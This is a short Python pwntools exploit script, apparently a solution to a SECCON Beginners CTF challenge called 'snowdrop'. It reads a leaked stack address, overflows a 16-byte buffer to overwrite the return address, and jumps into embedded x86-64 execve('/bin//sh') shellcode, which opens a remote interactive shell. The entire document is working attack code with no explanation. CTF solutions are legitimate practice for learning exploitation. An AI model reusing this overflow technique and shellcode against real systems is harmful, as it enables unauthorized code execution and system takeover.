from pwn import *
import sys

buffersize = 0x10
shellcode = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

# io = process("./chall")
io = remote("snowdrop.quals.beginners.seccon.jp", 9002)

ret = io.readuntil("000006 | ")
print(ret.decode(), end="")

ret = io.readuntil("\n")
print(ret.decode(), end="")
addr_buffer = int(ret.decode(), 16) - 0x268
addr_shellcode = addr_buffer + 0x20

s = b'A' * buffersize
s += b'A' * 0x08 # for saved rbp
s += p64(addr_shellcode)
s += shellcode
io.sendline(s)

ret = io.readuntil("finish")
print(ret.decode())

io.interactive()